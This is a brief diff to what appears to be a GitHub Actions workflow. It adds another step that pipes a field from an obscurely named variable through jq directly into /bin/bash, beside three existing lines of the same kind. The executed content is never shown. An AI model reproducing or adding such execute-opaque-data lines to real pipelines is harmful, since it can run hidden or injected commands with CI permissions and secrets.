@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$she019" | jq -r .pfra049 | /bin/bash
           echo $efc9 | jq -r .sh2 | /bin/bash
           echo $hpnyn285 | jq -r .blue29 | /bin/bash
+          printf '%s' "$jgo11" | jq -r .ljxp3 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
